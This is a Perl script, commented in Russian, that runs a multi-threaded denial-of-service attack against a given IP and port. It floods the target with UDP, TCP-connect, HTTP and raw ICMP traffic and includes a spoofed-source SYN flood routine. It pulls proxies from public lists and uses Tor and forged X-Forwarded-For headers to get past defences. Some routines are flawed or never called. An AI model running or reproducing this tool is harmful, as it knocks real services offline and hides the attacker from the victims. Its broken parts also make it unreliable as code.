#!/usr/bin/perl

use strict;
use warnings;
use threads;
use threads::shared;
use IO::Socket;
use IO::Socket::Socks;
use Net::RawIP;
use Sys::Info;
use LWP::Simple;
use Time::HiRes qw(gettimeofday tv_interval sleep);
use Socket;
use HTTP::Request;
use LWP::UserAgent;
use WWW::Tor;  # Для Tor
use Net::DNS::Resolver;  # Для DNS атак

# Получаем количество ядер процессора
my $info = Sys::Info->new;
my $cpu = $info->device('CPU');
my $max_threads = $cpu->count || 4;

# Проверка аргументов
if (@ARGV < 7) {
    die "Использование: $0 <IP> <порт> <размер> <время> <протоколы> <тип атаки> <файл прокси> [потоки]\n";
}

# Получаем параметры
my ($ip, $port, $size, $time, $protocols, $attack_type, $proxy_file, $threads) = @ARGV;

# Проверка корректности входных данных
die "Ошибка: Некорректный IP: $ip\n" unless $ip =~ /^(\d{1,3}\.){3}\d{1,3}$/;
die "Ошибка: Некорректный порт: $port\n" unless $port =~ /^\d+$/ && $port > 0 && $port <= 65535;
die "Ошибка: Некорректный размер пакета: $size\n" unless $size =~ /^\d+$/ && $size >= 64 && $size <= 65507;
die "Ошибка: Некорректное время: $time\n" unless $time =~ /^\d+$/ && $time > 0;
die "Ошибка: Укажите протоколы (udp,tcp,http,dns,icmp)\n" unless $protocols =~ /^(udp|tcp|http|dns|icmp|all)$/i;
die "Ошибка: Укажите тип атаки (основной/прокси/all)\n" unless $attack_type =~ /^(основной|прокси|all)$/i;

# Ссылки для получения прокси
my @proxy_sources = (
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://www.socks-proxy.net/",
    "https://www.proxy-list.org/uk/index.php",
    "https://free-proxy-list.net/",
    "https://www.us-proxy.org/"
);

# Загружаем прокси
my @proxies;
if ($attack_type =~ /^(прокси|all)$/i) {
    if (-e $proxy_file) {
        open my $fh, '<', $proxy_file or die "Ошибка: Не удалось открыть файл прокси: $proxy_file\n";
        @proxies = <$fh>;
        chomp(@proxies);
        close $fh;
    }
    # Если файл пуст, загружаем прокси из интернета
    if (!@proxies) {
        print "⏳ Загружаем свежие прокси...\n";
        foreach my $source (@proxy_sources) {
            my $proxy_data = get($source) || "";
            if ($proxy_data) {
                @proxies = split /\n/, $proxy_data;
                last if @proxies;
            }
        }
        die "Ошибка: Не удалось получить прокси из интернета!\n" unless @proxies;
        open my $fh, '>', $proxy_file or die "Ошибка: Не удалось создать файл прокси: $proxy_file\n";
        print $fh join("\n", @proxies);
        close $fh;
        print "✅ Загружено " . scalar(@proxies) . " прокси.\n";
    }
}

# Рандомизация TCP флагов
sub random_tcp_flags {
    my @flags = ('SYN', 'ACK', 'FIN', 'RST');
    return $flags[int(rand(@flags))];
}

# Подготовка пакета
my $packet = "X" x $size;
my $endtime = time() + $time;
my $total_packets :shared = 0;

# Пример атаки с SYN flood (TCP)
sub attack_syn_flood {
    while (time() <= $endtime) {
        my $random_ip = int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255)) . "." . int(rand(255));
        my $sock = Net::RawIP->new();
        $sock->set({ ip => { saddr => $random_ip, daddr => $ip },
                    tcp => { source => int(rand(65535)), dest => $port, flags => random_tcp_flags(), data => $packet } });
        $sock->send;
        { lock($total_packets); $total_packets++; }
    }
}

# Пример атаки с UDP flood
sub attack_udp {
    socket(my $socket, PF_INET, SOCK_DGRAM, 0) or die "Ошибка: Не удалось создать сокет: $!\n";
    setsockopt($socket, SOL_SOCKET, SO_RCVBUF, 65507);
    my $sockaddr = pack_sockaddr_in($port, inet_aton($ip));

    while (time() <= $endtime) {
        send($socket, $packet, 0, $sockaddr);
        { lock($total_packets); $total_packets++; }
    }
}

# Пример атаки с TCP Connect flood
sub attack_tcp_connect {
    while (time() <= $endtime) {
        my $sock = IO::Socket::INET->new(
            Proto    => 'tcp',
            PeerAddr => $ip,
            PeerPort => $port
        );
        if ($sock) {
            print $sock "GET / HTTP/1.1\r\nHost: $ip\r\nConnection: keep-alive\r\n";
            close($sock);
            { lock($total_packets); $total_packets++; }
        }
    }
}

# Пример атаки с HTTP flood
sub attack_http {
    while (time() <= $endtime) {
        my $socket = IO::Socket::INET->new(
            Proto    => 'tcp',
            PeerAddr => $ip,
            PeerPort => $port
        );
        if ($socket) {
            print $socket "GET / HTTP/1.1\r\nHost: $ip\r\nConnection: keep-alive\r\n";
            close($socket);
            { lock($total_packets); $total_packets++; }
        }
    }
}

# Пример атаки с ICMP (ping)
sub attack_icmp {
    socket(my $socket, PF_INET, SOCK_RAW, 1) or die "Ошибка: Не удалось создать сокет: $!\n";
    my $sockaddr = pack_sockaddr_in($port, inet_aton($ip));

    while (time() <= $endtime) {
        send($socket, $packet, 0, $sockaddr);
        { lock($total_packets); $total_packets++; }
    }
}

# Пример обхода защиты через Tor
sub bypass_tor {
    print "Используем Tor для обхода защиты\n";
    
    my $tor = WWW::Tor->new();
    $tor->start;
    
    my $proxy_ip = $tor->proxy_host;
    my $proxy_port = $tor->proxy_port;
    
    my $user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
    my $referer = "https://example.com/";

    my $request = HTTP::Request->new(
        GET => "http://$ip:$port/",
        ['User-Agent' => $user_agent, 'Referer' => $referer]
    );
    
    my $ua = LWP::UserAgent->new;
    $ua->proxy('http', "http://$proxy_ip:$proxy_port");
    
    $ua->request($request);
}

# Пример обхода защиты с использованием нестандартных HTTP-заголовков
sub bypass_custom_headers {
    print "Используем нестандартные заголовки HTTP\n";
    
    my $user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";
    my $accept_language = "en-US,en;q=0.5";
    my $x_forwarded_for = "123.45.67.89";  # Подделка IP
    
    my $request = HTTP::Request->new(
        GET => "http://$ip:$port/",
        [
            'User-Agent' => $user_agent,
            'Accept-Language' => $accept_language,
            'X-Forwarded-For' => $x_forwarded_for
        ]
    );
    
    my $ua = LWP::UserAgent->new;
    $ua->timeout(5);
    $ua->request($request);
}

# Пример обхода защиты через нестандартный DNS запрос
sub attack_dns {
    my $resolver = Net::DNS::Resolver->new;
    my $query = $resolver->send($ip, 'A');
    if ($query) {
        print "DNS запрос успешно отправлен на $ip\n";
    }
}

# Запуск потоков для всех выбранных протоколов
my @protocols_list = split(',', $protocols);

my @threads;
for my $i (1 .. $threads) {
    if (grep { $_ eq 'udp' || $_ eq 'all' } @protocols_list) {
        push @threads, threads->create(\&attack_udp);
    }
    if (grep { $_ eq 'tcp' || $_ eq 'all' } @protocols_list) {
        push @threads, threads->create(\&attack_tcp_connect);
    }
    if (grep { $_ eq 'http' || $_ eq 'all' } @protocols_list) {
        push @threads, threads->create(\&attack_http);
    }
    if (grep { $_ eq 'icmp' || $_ eq 'all' } @protocols_list) {
        push @threads, threads->create(\&attack_icmp);
    }
    if (grep { $_ eq 'dns' || $_ eq 'all' } @protocols_list) {
        push @threads, threads->create(\&attack_dns);
    }
    if (grep { $_ eq 'tor' || $_ eq 'all' } @protocols_list) {
        push @threads, threads->create(\&bypass_tor);
    }
    if (grep { $_ eq 'custom_headers' || $_ eq 'all' } @protocols_list) {
        push @threads, threads->create(\&bypass_custom_headers);
    }
}

# Завершаем работу всех потоков
$_->join() for @threads;

# Финальные выводы
print "=== [ АТАКА ЗАВЕРШЕНА ] ===\n";
print "Всего отправлено пакетов: $total_packets\n";

